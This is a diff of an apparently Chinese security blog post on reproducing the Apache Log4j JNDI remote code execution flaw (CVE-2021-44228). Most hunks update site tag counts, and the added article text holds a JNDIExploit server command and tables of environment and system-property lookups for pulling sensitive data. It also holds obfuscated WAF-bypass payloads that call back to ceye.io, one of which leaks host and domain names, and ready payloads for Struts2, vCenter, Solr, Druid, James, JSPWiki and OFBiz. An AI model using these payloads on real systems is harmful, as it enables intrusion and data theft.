@@ -40,7 +40,7 @@
 <meta itemprop="name" content="Apache Log4j任意代码执行漏洞">
 <meta itemprop="description" content="Apache Log4j任意代码执行漏洞"><meta itemprop="datePublished" content="2021-12-10T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2021-12-13T00:00:00+00:00" />
-<meta itemprop="wordCount" content="475">
+<meta itemprop="wordCount" content="919">
 <meta itemprop="keywords" content="漏洞复现," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Apache Log4j任意代码执行漏洞"/>
 <meta name="twitter:description" content="Apache Log4j任意代码执行漏洞"/>
@@ -157,6 +157,10 @@
                class="tag-list-count">1</span></a>
             
             
+            <a href="https://ad-calcium.github.io/tags/linux%E6%8F%90%E6%9D%83/" class="tag-list-link" rel="1">linux提权<span
+               class="tag-list-count">1</span></a>
+            
+            
             <a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link" rel="3">mssql<span
                class="tag-list-count">3</span></a>
             
@@ -229,8 +233,8 @@
                class="tag-list-count">1</span></a>
             
             
-            <a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link" rel="29">漏洞复现<span
-               class="tag-list-count">29</span></a>
+            <a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link" rel="30">漏洞复现<span
+               class="tag-list-count">30</span></a>
             
             
             <a href="https://ad-calcium.github.io/tags/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/" class="tag-list-link" rel="1">端口复用<span
@@ -284,7 +288,7 @@ function tagCloud(where, min, max) {
             <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="category-list-link">数据库</a><span class="category-list-count">3</span></li>
             <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="category-list-link">未授权漏洞</a><span class="category-list-count">1</span></li>
             <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="category-list-link">横向移动</a><span class="category-list-count">1</span></li>
-            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-list-link">漏洞复现</a><span class="category-list-count">27</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-list-link">漏洞复现</a><span class="category-list-count">28</span></li>
         </ul>
     </div>
 </div>
@@ -299,6 +303,10 @@ function tagCloud(where, min, max) {
             
             
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/exchange/" class="tag-list-link">exchange</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/linux%E6%8F%90%E6%9D%83/" class="tag-list-link">linux提权</a><span
                     class="tag-list-count">1</span></li>
             
             
@@ -375,7 +383,7 @@ function tagCloud(where, min, max) {
             
             
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link">漏洞复现</a><span
-                    class="tag-list-count">29</span></li>
+                    class="tag-list-count">30</span></li>
             
             
             <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/" class="tag-list-link">端口复用</a><span
@@ -494,8 +502,8 @@ function tagCloud(where, min, max) {
     <a class="article-tag-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"> 漏洞复现 </a>
   </span>
 
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 475字</span>
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 1分 </span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 919字</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 2分 </span>
       </div>
     </div>
     <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
@@ -549,6 +557,11 @@ payload=${jndi:ldap://9e735f2d.dns.1433.eu.org/xxxxxx}
 <p><img src="images/image-20211210122749895.png" alt="image-20211210122749895"></p>
 <p><img src="images/image-20211210122814540.png" alt="image-20211210122814540"></p>
 <h3 id="执行命令">执行命令</h3>
+<p>利用工具：https://github.com/ad-calcium/JNDIExploit</p>
+<pre><code>java -jar JNDIExploit-1.3-SNAPSHOT.jar  -i IP
+</code></pre>
+<p><img src="images/image-20220112172938169.png" alt="image-20220112172938169"></p>
+<p>调用不同的利用链执行命令</p>
 <pre><code>POST /hello HTTP/1.1
 Host: 10.108.0.52:8080
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
@@ -621,6 +634,654 @@ payload=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </code></pre>
 <h3 id="rc1绕过">RC1绕过</h3>
 <pre><code>${jndi:ldap://1.2.3.4:1389/ ClassName}
+</code></pre>
+<h3 id="获取敏感数据">获取敏感数据</h3>
+<h4 id="log4j-java">log4j-java</h4>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>usage</th>
+<th>method</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>${java:version}</td>
+<td>getSystemProperty(&ldquo;java.version&rdquo;)</td>
+</tr>
+<tr>
+<td>2</td>
+<td>${java:runtime}</td>
+<td>getRuntime()</td>
+</tr>
+<tr>
+<td>3</td>
+<td>${java:vm}</td>
+<td>getVirtualMachine()</td>
+</tr>
+<tr>
+<td>4</td>
+<td>${java:os}</td>
+<td>getOperatingSystem()</td>
+</tr>
+<tr>
+<td>5</td>
+<td>${java:hw}</td>
+<td>getHardware()</td>
+</tr>
+<tr>
+<td>6</td>
+<td>${java:locale}</td>
+<td>getLocale()</td>
+</tr>
+</tbody>
+</table>
+<h4 id="linux">Linux</h4>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>${env:CLASSPATH}</td>
+</tr>
+<tr>
+<td>2</td>
+<td>${env:HOME}</td>
+</tr>
+<tr>
+<td>3</td>
+<td>${env:JAVA_HOME}</td>
+</tr>
+<tr>
+<td>4</td>
+<td>${env:LANG}</td>
+</tr>
+<tr>
+<td>5</td>
+<td>${env:LC_TERMINAL}</td>
+</tr>
+<tr>
+<td>6</td>
+<td>${env:LC_TERMINAL_VERSION}</td>
+</tr>
+<tr>
+<td>7</td>
+<td>${env:LESS}</td>
+</tr>
+<tr>
+<td>8</td>
+<td>${env:LOGNAME}</td>
+</tr>
+<tr>
+<td>9</td>
+<td>${env:LSCOLORS}</td>
+</tr>
+<tr>
+<td>10</td>
+<td>${env:LS_COLORS}</td>
+</tr>
+<tr>
+<td>11</td>
+<td>${env:MAIL}</td>
+</tr>
+<tr>
+<td>12</td>
+<td>${env:NLSPATH}</td>
+</tr>
+<tr>
+<td>13</td>
+<td>${env:OLDPWD}</td>
+</tr>
+<tr>
+<td>14</td>
+<td>${env:PAGER}</td>
+</tr>
+<tr>
+<td>15</td>
+<td>${env:PATH}</td>
+</tr>
+<tr>
+<td>16</td>
+<td>${env:PWD}</td>
+</tr>
+<tr>
+<td>17</td>
+<td>${env:SHELL}</td>
+</tr>
+<tr>
+<td>18</td>
+<td>${env:SHLVL}</td>
+</tr>
+<tr>
+<td>19</td>
+<td>${env:SSH_CLIENT}</td>
+</tr>
+<tr>
+<td>20</td>
+<td>${env:SSH_CONNECTION}</td>
+</tr>
+<tr>
+<td>21</td>
+<td>${env:SSH_TTY}</td>
+</tr>
+<tr>
+<td>22</td>
+<td>${env:TERM}</td>
+</tr>
+<tr>
+<td>23</td>
+<td>${env:USER}</td>
+</tr>
+<tr>
+<td>24</td>
+<td>${env:XDG_RUNTIME_DIR}</td>
+</tr>
+<tr>
+<td>25</td>
+<td>${env:XDG_SESSION_ID}</td>
+</tr>
+<tr>
+<td>26</td>
+<td>${env:XFILESEARCHPATH}</td>
+</tr>
+<tr>
+<td>27</td>
+<td>${env:ZSH}</td>
+</tr>
+</tbody>
+</table>
+<h4 id="windows">Windows</h4>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>${env:A8_HOME}</td>
+</tr>
+<tr>
+<td>2</td>
+<td>${env:A8_ROOT_BIN}</td>
+</tr>
+<tr>
+<td>3</td>
+<td>${env:ALLUSERSPROFILE}</td>
+</tr>
+<tr>
+<td>4</td>
+<td>${env:APPDATA}</td>
+</tr>
+<tr>
+<td>5</td>
+<td>${env:CATALINA_BASE}</td>
+</tr>
+<tr>
+<td>6</td>
+<td>${env:CATALINA_HOME}</td>
+</tr>
+<tr>
+<td>7</td>
+<td>${env:CATALINA_OPTS}</td>
+</tr>
+<tr>
+<td>8</td>
+<td>${env:CATALINA_TMPDIR}</td>
+</tr>
+<tr>
+<td>9</td>
+<td>${env:CLASSPATH}</td>
+</tr>
+<tr>
+<td>10</td>
+<td>${env:CLIENTNAME}</td>
+</tr>
+<tr>
+<td>11</td>
+<td>${env:COMPUTERNAME}</td>
+</tr>
+<tr>
+<td>12</td>
+<td>${env:ComSpec}</td>
+</tr>
+<tr>
+<td>13</td>
+<td>${env:CommonProgramFiles}</td>
+</tr>
+<tr>
+<td>14</td>
+<td>${env:CommonProgramFiles(x86)}</td>
+</tr>
+<tr>
+<td>15</td>
+<td>${env:CommonProgramW6432}</td>
+</tr>
+<tr>
+<td>16</td>
+<td>${env:FP_NO_HOST_CHECK}</td>
+</tr>
+<tr>
+<td>17</td>
+<td>${env:HOMEDRIVE}</td>
+</tr>
+<tr>
+<td>18</td>
+<td>${env:HOMEPATH}</td>
+</tr>
+<tr>
+<td>19</td>
+<td>${env:JRE_HOME}</td>
+</tr>
+<tr>
+<td>20</td>
+<td>${env:Java_Home}</td>
+</tr>
+<tr>
+<td>21</td>
+<td>${env:LOCALAPPDATA}</td>
+</tr>
+<tr>
+<td>22</td>
+<td>${env:LOGONSERVER}</td>
+</tr>
+<tr>
+<td>23</td>
+<td>${env:NUMBER_OF_PROCESSORS}</td>
+</tr>
+<tr>
+<td>24</td>
+<td>${env:OS}</td>
+</tr>
+<tr>
+<td>25</td>
+<td>${env:PATHEXT}</td>
+</tr>
+<tr>
+<td>26</td>
+<td>${env:PROCESSOR_ARCHITECTURE}</td>
+</tr>
+<tr>
+<td>27</td>
+<td>${env:PROCESSOR_IDENTIFIER}</td>
+</tr>
+<tr>
+<td>28</td>
+<td>${env:PROCESSOR_LEVEL}</td>
+</tr>
+<tr>
+<td>29</td>
+<td>${env:PROCESSOR_REVISION}</td>
+</tr>
+<tr>
+<td>30</td>
+<td>${env:PROMPT}</td>
+</tr>
+<tr>
+<td>31</td>
+<td>${env:PSModulePath}</td>
+</tr>
+<tr>
+<td>32</td>
+<td>${env:PUBLIC}</td>
+</tr>
+<tr>
+<td>33</td>
+<td>${env:Path}</td>
+</tr>
+<tr>
+<td>34</td>
+<td>${env:ProgramData}</td>
+</tr>
+<tr>
+<td>35</td>
+<td>${env:ProgramFiles}</td>
+</tr>
+<tr>
+<td>36</td>
+<td>${env:ProgramFiles(x86)}</td>
+</tr>
+<tr>
+<td>37</td>
+<td>${env:ProgramW6432}</td>
+</tr>
+<tr>
+<td>38</td>
+<td>${env:SESSIONNAME}</td>
+</tr>
+<tr>
+<td>39</td>
+<td>${env:SystemDrive}</td>
+</tr>
+<tr>
+<td>40</td>
+<td>${env:SystemRoot}</td>
+</tr>
+<tr>
+<td>41</td>
+<td>${env:TEMP}</td>
+</tr>
+<tr>
+<td>42</td>
+<td>${env:TMP}</td>
+</tr>
+<tr>
+<td>43</td>
+<td>${env:ThisExitCode}</td>
+</tr>
+<tr>
+<td>44</td>
+<td>${env:USERDOMAIN}</td>
+</tr>
+<tr>
+<td>45</td>
+<td>${env:USERNAME}</td>
+</tr>
+<tr>
+<td>46</td>
+<td>${env:USERPROFILE}</td>
+</tr>
+<tr>
+<td>47</td>
+<td>${env:WORK_PATH}</td>
+</tr>
+<tr>
+<td>48</td>
+<td>${env:windir}</td>
+</tr>
+<tr>
+<td>49</td>
+<td>${env:windows_tracing_flags}</td>
+</tr>
+<tr>
+<td>50</td>
+<td>${env:windows_tracing_logfile}</td>
+</tr>
+</tbody>
+</table>
+<h4 id="log4j2-sys">log4j2-sys</h4>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>${sys:awt.toolkit}</td>
+</tr>
+<tr>
+<td>2</td>
+<td>${sys:file.encoding}</td>
+</tr>
+<tr>
+<td>3</td>
+<td>${sys:file.encoding.pkg}</td>
+</tr>
+<tr>
+<td>4</td>
+<td>${sys:file.separator}</td>
+</tr>
+<tr>
+<td>5</td>
+<td>${sys:java.awt.graphicsenv}</td>
+</tr>
+<tr>
+<td>6</td>
+<td>${sys:java.awt.printerjob}</td>
+</tr>
+<tr>
+<td>7</td>
+<td>${sys:java.class.path}</td>
+</tr>
+<tr>
+<td>8</td>
+<td>${sys:java.class.version}</td>
+</tr>
+<tr>
+<td>9</td>
+<td>${sys:java.endorsed.dirs}</td>
+</tr>
+<tr>
+<td>10</td>
+<td>${sys:java.ext.dirs}</td>
+</tr>
+<tr>
+<td>11</td>
+<td>${sys:java.home}</td>
+</tr>
+<tr>
+<td>12</td>
+<td>${sys:java.io.tmpdir}</td>
+</tr>
+<tr>
+<td>13</td>
+<td>${sys:java.library.path}</td>
+</tr>
+<tr>
+<td>14</td>
+<td>${sys:java.runtime.name}</td>
+</tr>
+<tr>
+<td>15</td>
+<td>${sys:java.runtime.version}</td>
+</tr>
+<tr>
+<td>16</td>
+<td>${sys:java.specification.name}</td>
+</tr>
+<tr>
+<td>17</td>
+<td>${sys:java.specification.vendor}</td>
+</tr>
+<tr>
+<td>18</td>
+<td>${sys:java.specification.version}</td>
+</tr>
+<tr>
+<td>19</td>
+<td>${sys:java.vendor}</td>
+</tr>
+<tr>
+<td>20</td>
+<td>${sys:java.vendor.url}</td>
+</tr>
+<tr>
+<td>21</td>
+<td>${sys:java.vendor.url.bug}</td>
+</tr>
+<tr>
+<td>22</td>
+<td>${sys:java.version}</td>
+</tr>
+<tr>
+<td>23</td>
+<td>${<a href="http://sys:java.vm.info/">sys:java.vm.info</a>}</td>
+</tr>
+<tr>
+<td>24</td>
+<td>${sys:java.vm.name}</td>
+</tr>
+<tr>
+<td>25</td>
+<td>${sys:java.vm.specification.name}</td>
+</tr>
+<tr>
+<td>26</td>
+<td>${sys:java.vm.specification.vendor}</td>
+</tr>
+<tr>
+<td>27</td>
+<td>${sys:java.vm.specification.version}</td>
+</tr>
+<tr>
+<td>28</td>
+<td>${sys:java.vm.vendor}</td>
+</tr>
+<tr>
+<td>29</td>
+<td>${sys:java.vm.version}</td>
+</tr>
+<tr>
+<td>30</td>
+<td>${sys:line.separator}</td>
+</tr>
+<tr>
+<td>31</td>
+<td>${sys:os.arch}</td>
+</tr>
+<tr>
+<td>32</td>
+<td>${sys:os.name}</td>
+</tr>
+<tr>
+<td>33</td>
+<td>${sys:os.version}</td>
+</tr>
+<tr>
+<td>34</td>
+<td>${sys:path.separator}</td>
+</tr>
+<tr>
+<td>35</td>
+<td>${sys:sun.arch.data.model}</td>
+</tr>
+<tr>
+<td>36</td>
+<td>${sys:sun.boot.class.path}</td>
+</tr>
+<tr>
+<td>37</td>
+<td>${sys:sun.boot.library.path}</td>
+</tr>
+<tr>
+<td>38</td>
+<td>${sys:sun.cpu.endian}</td>
+</tr>
+<tr>
+<td>39</td>
+<td>${sys:sun.cpu.isalist}</td>
+</tr>
+<tr>
+<td>40</td>
+<td>${sys:sun.desktop}</td>
+</tr>
+<tr>
+<td>41</td>
+<td>${sys:sun.io.unicode.encoding}</td>
+</tr>
+<tr>
+<td>42</td>
+<td>${sys:sun.java.command}</td>
+</tr>
+<tr>
+<td>43</td>
+<td>${sys:sun.java.launcher}</td>
+</tr>
+<tr>
+<td>44</td>
+<td>${sys:sun.jnu.encoding}</td>
+</tr>
+<tr>
+<td>45</td>
+<td>${sys:sun.management.compiler}</td>
+</tr>
+<tr>
+<td>46</td>
+<td>${sys:sun.os.patch.level}</td>
+</tr>
+<tr>
+<td>47</td>
+<td>${sys:sun.stderr.encoding}</td>
+</tr>
+<tr>
+<td>48</td>
+<td>${sys:user.country}</td>
+</tr>
+<tr>
+<td>49</td>
+<td>${sys:user.dir}</td>
+</tr>
+<tr>
+<td>50</td>
+<td>${sys:user.home}</td>
+</tr>
+<tr>
+<td>51</td>
+<td>${sys:user.language}</td>
+</tr>
+<tr>
+<td>52</td>
+<td>${sys:user.name}</td>
+</tr>
+<tr>
+<td>53</td>
+<td>${sys:user.script}</td>
+</tr>
+<tr>
+<td>54</td>
+<td>${sys:user.timezone}</td>
+</tr>
+<tr>
+<td>55</td>
+<td>${sys:user.variant}</td>
+</tr>
+</tbody>
+</table>
+<h3 id="waf-bypass">WAF Bypass</h3>
+<pre><code>${jndi:ldap://127.0.0.1:1389/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a}
+${${::-j}ndi:rmi://ceye.io/a}
+${jndi:rmi://ceye.io}
+${${lower:jndi}:${lower:rmi}://ceye.io/a}
+${${lower:${lower:jndi}}:${lower:rmi}://ceye.io/a}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://ceye.io/a}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://ceye.io/a}
+${${upper:jndi}:${upper:rmi}://ceye.io/a}
+${${upper:j}${upper:n}${lower:d}i:${upper:rmi}://ceye.io/a}
+${${upper:j}${upper:n}${upper:d}${upper:i}:${lower:r}m${lower:i}}://ceye.io/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.ceye.io}
+${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://${hostName}.ceye.io}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.ceye.io
+</code></pre>
+<h3 id="其它已知受影响组件可利用的payload">其它已知受影响组件可利用的payload</h3>
+<pre><code>Apache struts2
+http://127.0.0.1:8080/struts2-showcase/token/transfer4.action -d struts.token.name='${jndi:rmi://127.0 .0.1:1099/ylbtsl}'
+http://localhost:8080/struts2-showcase/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/
+ 
+VMWare VCenter
+&quot;X-Forwarded-For: \${jndi:ldap://10.0.0.3:1270/lol}&quot; &quot;https://10.0.0.4/websso/SAML2/SSO/photon- machine.lan?SAMLRequest=&quot;
+ 
+Apache James
+&quot;smtp://localhost&quot; --user &quot;test:test&quot; --mail-from '${jndi:ldap://localhost:1270/a}@gmail.com' --mail-rcpt 'test' --upload-file email.txt
+ 
+Apache Solr
+'http://localhost:8983/solr/admin/cores?action=CREATE&amp;name=$%7Bjndi:ldap://10.0.0.6:1270/abc%7D&amp;wt=json'
+solr/admin/info/system?_=${jndi:ldap://192.168.1.1/exp}&amp;wt=json
+ 
+Apache Druid
+'http://localhost:8888/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2flocalhost:1270%2fabc%7d'
+ 
+Apache JSPWiki
+http://localhost:8080/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/
+ 
+Apache OFBiz
+&quot;Cookie: OFBiz.Visitor=\${jndi:ldap://localhost:1270/abc}&quot; https://localhost:8443/webtools/control/main
+ 
+</code></pre>
+<p>参考地址</p>
+<pre><code>https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words
 </code></pre>
 
     </div>
